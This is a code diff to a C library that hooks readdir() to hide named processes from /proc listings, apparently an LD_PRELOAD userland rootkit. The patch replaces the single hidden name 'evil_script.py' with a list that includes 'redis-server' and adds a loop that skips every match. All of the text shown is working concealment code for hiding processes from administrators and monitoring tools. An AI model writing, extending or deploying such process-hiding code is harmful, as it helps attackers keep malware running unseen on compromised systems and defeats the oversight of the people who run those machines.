@@ -7,9 +7,10 @@
 #include <unistd.h>
 
 /*
- * Every process with this name will be excluded
+ * Array of process names to filter
  */
-static const char* process_to_filter = "evil_script.py";
+static const char* processes_to_filter[] = {"redis-server", ""};
+static const int num_processes_to_filter = sizeof(processes_to_filter) / sizeof(processes_to_filter[0]);
 
 /*
  * Get a directory name given a DIR* handle
@@ -43,7 +44,7 @@ static int get_process_name(char* pid, char* buf)
 
     char tmp[256];
     snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
- 
+
     FILE* f = fopen(tmp, "r");
     if(f == NULL) {
         return 0;
@@ -84,9 +85,17 @@ struct dirent* readdir(DIR *dirp)                                       \
             char process_name[256];                                     \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
-                continue;                                               \
+                get_process_name(dir->d_name, process_name)) {          \
+                int skip = 0;                                           \
+                for (int i = 0; i < num_processes_to_filter; i++) {     \
+                    if (strcmp(process_name, processes_to_filter[i]) == 0) { \
+                        skip = 1;                                       \
+                        break;                                          \
+                    }                                                   \
+                }                                                       \
+                if (skip) {                                             \
+                    continue;                                           \
+                }                                                       \
             }                                                           \
         }                                                               \
         break;                                                          \
